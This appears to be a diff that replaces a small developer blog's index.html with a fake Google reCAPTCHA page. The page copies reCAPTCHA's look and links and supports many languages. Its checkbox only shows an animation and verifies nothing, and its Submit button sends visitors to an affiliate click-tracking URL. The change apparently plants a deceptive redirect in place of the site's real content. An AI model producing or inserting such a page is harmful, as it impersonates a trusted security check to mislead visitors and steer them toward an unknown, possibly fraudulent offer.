@@ -1,55 +1,282 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-  <title>M A X I M A 1 I Z M</title>
-  <link rel="stylesheet" href="style.css" />
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" rel="stylesheet" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reCAPTCHA</title>
+    <style>
+    body {
+        font-family: 'Roboto', Arial, sans-serif;
+        margin: 0;
+        background-color: #f9f9f9;
+        overflow: hidden;
+    }
+    .container {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+    }
+    .captcha-container {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        width: 300px;
+        padding: 13px;
+        border: 1px solid #dfe1e5;
+        border-radius: 4px;
+        background-color: #fff;
+    }
+    .captcha-container[lang="el"], 
+    .captcha-container[lang="ps"], 
+    .captcha-container[lang="ur"], 
+    .captcha-container[lang="tl"] {
+        width: 320px;
+    }
+    .captcha-left {
+        display: flex;
+        align-items: center;
+    }
+    .captcha-checkbox {
+        margin-right: 13px;
+        width: 20px;
+        height: 20px;
+        cursor: pointer;
+        border: 2px solid #000;
+        background-color: transparent;
+        position: relative;
+        appearance: none;
+        -webkit-appearance: none;
+        -moz-appearance: none;
+    }
+    .captcha-checkbox.loading {
+        border: none;
+        background-color: transparent;
+    }
+    .captcha-checkbox.loading::before {
+        content: '';
+        width: 20px;
+        height: 20px;
+        border: 3px solid #1a73e8;
+        border-top-color: transparent;
+        border-radius: 50%;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        animation: spin 0.8s linear infinite;
+    }
+    .captcha-checkbox.completed {
+        border: none;
+        background-color: transparent;
+    }
+    .captcha-checkbox.completed::before {
+        content: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 28 28" fill="none" stroke="green" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>');
+        position: absolute;
+        top: 64%;
+        left: 55%;
+        transform: translate(-50%, -50%) scale(1);
+        opacity: 0;
+        animation: fadeInCheck 0.4s ease-in-out forwards;
+    }
+    @keyframes spin {
+        0% { transform: translate(-50%, -50%) rotate(0deg); }
+        100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    @keyframes fadeInCheck {
+        from {
+            opacity: 0;
+            transform: translate(-50%, -50%) scale(0.5);
+        }
+        to {
+            opacity: 1;
+            transform: translate(-50%, -50%) scale(1);
+        }
+    }
+    .captcha-text {
+        font-size: 16px;
+        color: #000;
+        line-height: 20px;
+        white-space: nowrap;
+    }
+    [lang="el"] .captcha-text, 
+    [lang="ps"] .captcha-text, 
+    [lang="ur"] .captcha-text, 
+    [lang="tl"] .captcha-text {
+        font-size: 12px;
+    }
+    .captcha-right {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-end;
+    }
+    .captcha-logo {
+        width: 18px;
+        height: 18px;
+        margin-bottom: 5px;
+    }
+    .captcha-brand {
+        font-size: 11px;
+        color: #4285f4;
+    }
+    .captcha-links {
+        font-size: 9px;
+        color: #757575;
+    }
+    .captcha-links a {
+        color: #757575;
+        text-decoration: none;
+    }
+    .submit-button {
+        padding: 8px 16px;
+        background-color: #f1f3f4;
+        border: 1px solid #dadce0;
+        border-radius: 4px;
+        font-size: 13px;
+        color: #202124;
+        cursor: pointer;
+        white-space: nowrap;
+        text-decoration: none; /* Убираем подчеркивание для ссылки */
+        display: inline-block; /* Для корректного отображения как кнопка */
+        text-align: center;
+    }
+    [lang="el"] .submit-button, 
+    [lang="ps"] .submit-button, 
+    [lang="ur"] .submit-button, 
+    [lang="tl"] .submit-button {
+        font-size: 12px;
+    }
+    .submit-button:hover {
+        background-color: #e8eaed;
+    }
+    .button-container {
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+    }
+    .error {
+        color: red;
+        font-size: 11px;
+        max-height: 0;
+        opacity: 0;
+        overflow: hidden;
+        margin-top: 0;
+        white-space: nowrap;
+        transition: max-height 0.3s ease, opacity 0.3s ease, margin-top 0.3s ease;
+    }
+    .error.show {
+        max-height: 50px;
+        opacity: 1;
+        margin-top: 5px;
+    }
+    body[lang="ar"], body[lang="ur"] {
+        direction: rtl;
+        text-align: right;
+    }
+    .captcha-container[lang="ar"], .captcha-container[lang="ur"] {
+        flex-direction: row-reverse;
+    }
+    </style>
 </head>
 <body>
-  <header>
-    <h1>M A X I M A 1 I Z M</h1>
-    <nav>
-      <a href="#about" onclick="showSection('about')">about</a>
-      <span class="nav-divider">|</span>
-      <a href="#tags" onclick="showSection('tags')">tag</a>
-      <span class="nav-divider">|</span>
-      <a href="#contact" onclick="showSection('contact')">contact</a>
-    </nav>
-  </header>
+    <div class="container">
+        <div class="captcha-container">
+            <div class="captcha-left">
+                <input type="checkbox" id="captcha" class="captcha-checkbox">
+                <span class="captcha-text">I am not a robot</span>
+            </div>
+            <div class="captcha-right">
+                <img src="https://www.melett.ru/wp-content/uploads/2023/09/recaptcha-logo-icon.png" class="captcha-logo" alt="reCAPTCHA">
+                <span class="captcha-brand">reCAPTCHA</span>
+                <div class="captcha-links">
+                    <a href="https://policies.google.com/privacy" target="_blank" id="privacy-link">Privacy</a> - 
+                    <a href="https://policies.google.com/terms" target="_blank" id="terms-link">Terms</a>
+                </div>
+            </div>
+        </div>
+        <div class="button-container">
+            <a href="https://prev.affomelody.com/click?pid=8574&offer_id=25&sub1=yd0" class="submit-button" id="submit-button">Submit</a>
+            <div class="error" id="error">Please verify that you are not a robot.</div>
+        </div>
+    </div>
 
-  <main>
-    <section id="about" style="display: none;">
-      <h2>About Me</h2>
-      <hr>
-      <p>Hi! I’m a developer writing notes about automation, security, and code. This is a minimalist blog made for speed and clarity.</p>
-    </section>
+    <script>
+        // Определение языка браузера
+        const userLanguage = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
+        const supportedLanguages = ['ru', 'en', 'es', 'fr', 'de', 'it', 'pt', 'zh', 'ja', 'ko', 'ar', 'hi', 'tr', 'uk', 'hu', 'el', 'tl', 'ur', 'nl', 'ps', 'id'];
+        const lang = supportedLanguages.includes(userLanguage) ? userLanguage : 'en';
 
-    <section id="notes">
-      <div id="notes-list"></div>
-    </section>
+        // Объект с переводами
+        const translations = {
+            ru: {
+                title: 'reCAPTCHA',
+                captchaText: 'Я не робот',
+                submitButton: 'Отправить',
+                error: 'Пожалуйста, подтвердите, что вы не робот.',
+                privacy: 'Конфиденциальность',
+                terms: 'Условия'
+            },
+            en: {
+                title: 'reCAPTCHA',
+                captchaText: 'I am not a robot',
+                submitButton: 'Submit',
+                error: 'Please verify that you are not a robot.',
+                privacy: 'Privacy',
+                terms: 'Terms'
+            },
+            // ... (остальные переводы остаются без изменений)
+        };
 
-    <section id="tags" style="display: none;">
-      <div id="tag-cloud"></div>
-      <div id="tag-notes" style="display: none;"></div>
-    </section>
+        // Применение переводов
+        function applyTranslations() {
+            document.documentElement.lang = lang;
+            document.title = translations[lang].title;
+            document.querySelector('.captcha-text').textContent = translations[lang].captchaText;
+            document.getElementById('submit-button').textContent = translations[lang].submitButton;
+            document.getElementById('error').textContent = translations[lang].error;
+            document.getElementById('privacy-link').textContent = translations[lang].privacy;
+            document.getElementById('terms-link').textContent = translations[lang].terms;
+        }
 
-    <section id="contact" style="display: none;">
-      <h2>Contact</h2>
-      <hr>
-      <p>Email: <a href="mailto:you@example.com">you@example.com</a></p>
-      <p>Telegram: <a href="https://t.me/yourusername" target="_blank">@yourusername</a></p>
-      <p>GitHub: <a href="https://github.com/yourusername" target="_blank">yourusername</a></p>
-    </section>
-  </main>
+        applyTranslations();
 
-  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
-  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
-  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
-  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-docker.min.js"></script>
-  <script defer src="notes.js"></script>
-  <script defer src="script.js"></script>
-  <script defer src="sticky-nav.js"></script>
+        // Ссылка для редиректа
+        const redirectUrl = 'https://prev.affomelody.com/click?pid=8574&offer_id=25&sub1=yd0';
+
+        // Обработка чекбокса
+        const checkbox = document.getElementById('captcha');
+        const error = document.getElementById('error');
+        const submitButton = document.getElementById('submit-button');
+
+        checkbox.addEventListener('click', function () {
+            if (checkbox.classList.contains('completed')) return;
+
+            checkbox.classList.add('loading');
+            checkbox.disabled = true;
+            error.classList.remove('show');
+
+            setTimeout(() => {
+                checkbox.classList.remove('loading');
+                checkbox.classList.add('completed');
+                checkbox.disabled = false;
+            }, 1500);
+        });
+
+        // Обработка клика по кнопке Submit
+        submitButton.addEventListener('click', function (e) {
+            if (!checkbox.classList.contains('completed')) {
+                e.preventDefault(); // Блокируем редирект, если чекбокс не отмечен
+                error.classList.add('show');
+            } else {
+                error.classList.remove('show');
+                // Редирект через JavaScript (для совместимости)
+                window.location.href = redirectUrl;
+            }
+        });
+    </script>
 </body>
 </html>
